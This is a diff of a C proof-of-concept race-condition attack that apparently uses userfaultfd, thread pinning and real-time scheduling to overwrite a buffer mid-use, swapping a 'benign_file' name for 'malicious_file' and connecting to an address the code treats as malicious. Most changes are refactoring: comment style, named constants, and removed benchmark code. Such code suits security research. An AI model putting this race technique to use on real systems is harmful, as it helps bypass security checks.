@@ -5,59 +5,62 @@
 #include <stdint.h>
 #include <errno.h>
 #include <unistd.h>
-// sched
+/* sched */
 #include <sched.h>
 #include <sys/wait.h>
 #include <assert.h>
 #include <stdbool.h>
-// userfaultfd
+/* userfaultfd */
 #include <linux/userfaultfd.h>
-// file flag
+/* file flag */
 #include <fcntl.h>
-// mmap
+/* mmap */
 #include <sys/mman.h>
-// string
+/* string */
 #include <string.h>
-// gettid
+/* gettid */
 #include <sys/types.h>
 #include <syscall.h>
-// userfaultfd
+/* userfaultfd */
 #include <linux/userfaultfd.h>
 #include <sys/ioctl.h>
-// POLLER 
+/* POLLER */
 #include <poll.h>
-// nanosleep
+/* nanosleep */
 #include <time.h>
-// x86-64 Linux
-// #define __NR_nanosleep 35
-#include <asm/unistd.h>      // compile without -m32 for 64 bit call numbers
-// AF_INET
+/* compile without -m32 for 64 bit call numbers */
+#include <asm/unistd.h>      
+/* AF_INET */
 #include <netdb.h>
 #include <netinet/in.h>
-
 #include <string.h>
+
+#define COUNT_DONE  20
+#define COUNT_HALT1  1
+#define COUNT_HALT2  6
+#define FAULT_THREAD_CPU 1
+#define ATTACK_CPU 2
+#define VICTIM_CPU 3
+#define PRIORITY_MAIN 0
+#define PRIORITY_OVERWRITE 42
+#define BUSYLOOP_COUNT 320000000
 
 #define FORCE_INLINE __attribute__((always_inline)) inline
 
 #define handle_error_en(en, msg) \
-      do { errno = en; perror(msg); exit(EXIT_FAILURE); } while (0)
+  do { errno = en; perror(msg); exit(EXIT_FAILURE); } while (0)
 
 #ifndef SYS_gettid
 #error "SYS_gettid unavailable on this system"
 #endif
 
-
 #define gettid() ((pid_t)syscall(SYS_gettid))
-
 
 static int page_size;
 static volatile char *page = NULL;
 char filename[] = "malicious_file";
 
-int  count = 0;
-#define COUNT_DONE  20
-#define COUNT_HALT1  1
-#define COUNT_HALT2  6
+int count = 0;
 
 pthread_mutex_t count_mutex     = PTHREAD_MUTEX_INITIALIZER;
 pthread_mutex_t condition_mutex = PTHREAD_MUTEX_INITIALIZER;
@@ -65,26 +68,20 @@ pthread_cond_t  condition_cond  = PTHREAD_COND_INITIALIZER;
 
 static void display_thread_sched_attr(char *msg);
 
-static inline void busyloop(int overwrite_delay) {
+static inline void 
+busyloop(int overwrite_delay) 
+{
   for (int i = 0; i < overwrite_delay; i++) {
     __asm__ volatile("" : "+g" (i) : :);
   }
 }
 
-static volatile void write_char(char *string, int len) {
+static volatile void 
+write_char(char *string, int len) 
+{
   for(int i = 0; i < len; i++) {
     page[i] = string[i];
   }
-}
-
-// benchmark helper
-static inline uint64_t rdtsc() {
-  uint64_t a = 0, d = 0;
-  asm volatile("mfence");
-  asm volatile("rdtscp" : "=a"(a), "=d"(d) :: "rcx");
-  a = (d << 32) | a;
-  asm volatile("mfence");
-  return a;
 }
 
 static inline void maccess(void *p) {
@@ -183,7 +180,7 @@ fault_handler_thread(void *arg)
 
     uffd = (long) arg;
     
-    set_affinity(1);
+    set_affinity(FAULT_THREAD_CPU);
     /* Create a page that will be copied into the faulting region */
     if (page == NULL) {
         page = mmap(NULL, page_size, PROT_READ | PROT_WRITE,
@@ -346,7 +343,8 @@ display_thread_sched_attr(char *msg)
 }
 
 
-FORCE_INLINE int nanosleep_helper(long nsec)
+FORCE_INLINE int 
+nanosleep_helper(long nsec)
 {
    struct timespec req, rem;
    req.tv_sec = 0;
@@ -366,78 +364,57 @@ FORCE_INLINE int nanosleep_helper(long nsec)
    return ret;
 }
 
-FORCE_INLINE void do_connect(struct sockaddr_in *serv_addr) {
-   int sockfd, portno, n;
-   struct hostent *server;
+FORCE_INLINE void 
+do_connect(struct sockaddr_in *serv_addr) 
+{
+  int sockfd, portno, n;
+  struct hostent *server;
 
-   char buffer[256];
+  char buffer[256];
 
-   //printf("do_connect\n");
-   portno = 80;
+  //printf("do_connect\n");
+  portno = 80;
 
-   /* Create a socket point */
-   sockfd = socket(AF_INET, SOCK_STREAM, 0);
+  /* Create a socket point */
+  sockfd = socket(AF_INET, SOCK_STREAM, 0);
 
-   if (sockfd < 0) {
-      perror("ERROR opening socket");
-      exit(1);
-   }
+  if (sockfd < 0) {
+    perror("ERROR opening socket");
+    exit(1);
+  }
 
-   // We assume 1.1.1.1 is a malicious IP
-   server = gethostbyname("1.1.1.1");
+  // We assume 1.1.1.1 is a malicious IP
+  server = gethostbyname("1.1.1.1");
 
-   if (server == NULL) {
-      fprintf(stderr,"ERROR, no such host\n");
-      exit(0);
-   }
+  if (server == NULL) {
+    fprintf(stderr,"ERROR, no such host\n");
+    exit(0);
+  }
 
-   bzero((char *) serv_addr, sizeof(*serv_addr));
-   serv_addr->sin_family = AF_INET;
-   bcopy((char *)server->h_addr, (char *)&serv_addr->sin_addr.s_addr, server->h_length);
-   serv_addr->sin_port = htons(portno);
+  bzero((char *) serv_addr, sizeof(*serv_addr));
+  serv_addr->sin_family = AF_INET;
+  bcopy((char *)server->h_addr, (char *)&serv_addr->sin_addr.s_addr, server->h_length);
+  serv_addr->sin_port = htons(portno);
 
-   /* Now connect to the server */
-   //printf("%d\n", serv_addr->sin_addr.s_addr);
-   if (connect(sockfd, (struct sockaddr*)serv_addr, sizeof(*serv_addr)) < 0) {
-      perror("****************** ERROR connecting: attack fail *********************");
-      exit(1);
-   }
+  /* Now connect to the server */
+  if (connect(sockfd, (struct sockaddr*)serv_addr, sizeof(*serv_addr)) < 0) {
+    perror("****************** ERROR connecting: attack fail *********************");
+    exit(1);
+  }
 }
 
 
 static void *
 thread_start(void *arg)
 {
-  set_affinity(2);
-  //display_thread_sched_attr("Scheduler attributes of new thread");
+  set_affinity(ATTACK_CPU);
 
   char fakename[] = "benign_file";
-  int overwrite_delay = *(int*)arg;
   
   receiver();
-  //printf("overwrite_delay = %d\n", overwrite_delay);
-#ifdef BENCHMARK
-  uint64_t start = rdtsc();
-#endif 
-  // busy loop: this blocks other thread
-  // busyloop(overwrite_delay);
- 
-  // yield with syscall 
-  /*
-  int s = nanosleep_helper(overwrite_delay);
-  if (s != 0) {
-    handle_error_en(s, "nanosleep");
-  }*/
-#ifdef BENCHMARK
-  uint64_t end = rdtsc();
-  uint64_t diff = end - start;
 
-  printf("start = %ld, end = %ld, diff = %ld\n", start, end, diff);
-  fflush(stdout);
-#endif
   asm volatile("mfence");
   write_char(fakename, sizeof(fakename));
-  //strncpy(page, fakename, sizeof(fakename));
   asm volatile("mfence");
   flush(page);
   
@@ -455,7 +432,9 @@ thread_start(void *arg)
 
 
 // set the scheduling priority for each thread
-void set_child_scheduling(pthread_attr_t* attr, int policy, int priority) {
+void 
+set_child_scheduling(pthread_attr_t* attr, int policy, int priority) 
+{
   int s;
   struct sched_param param;
 
@@ -470,27 +449,27 @@ void set_child_scheduling(pthread_attr_t* attr, int policy, int priority) {
  
   display_thread_sched_attr("Scheduler settings of main thread");
   printf("\n");
-  //policy = sched_getscheduler(0);
 }
 
 
 
 int
-main(int argc, char *argv[]) {
+main(int argc, char *argv[]) 
+{
   int s;
   pthread_attr_t attr;
   pthread_t thread;
   struct sched_param param;
   int policy;
 
-  set_affinity(3);
+  set_affinity(VICTIM_CPU);
   
   // set up the page
   page_size = sysconf(_SC_PAGE_SIZE);
   page = mmap(NULL, page_size, PROT_READ | PROT_WRITE,
               MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
   if (page == MAP_FAILED)
-      handle_error_en(page, "mmap failure");
+    handle_error_en(page, "mmap failure");
 
   // set up userfaultfd
   s = userfaultfd_setup(page, 1);
@@ -517,13 +496,8 @@ main(int argc, char *argv[]) {
   policy = SCHED_RR;
   set_child_scheduling(&attr, policy, priority); 
   
-  // read out the overwrite delay
-  //int overwrite_delay = strtol(argv[1], NULL, 0);
-  int overwrite_delay = 1000;
-  
   // start new thread 
-  s = pthread_create(&thread, &attr, &thread_start, &overwrite_delay);
-  //s = pthread_create(&thread, NULL, &thread_start, &overwrite_delay);
+  s = pthread_create(&thread, &attr, &thread_start, NULL);
   if (s != 0)
       handle_error_en(s, "pthread_create");
 
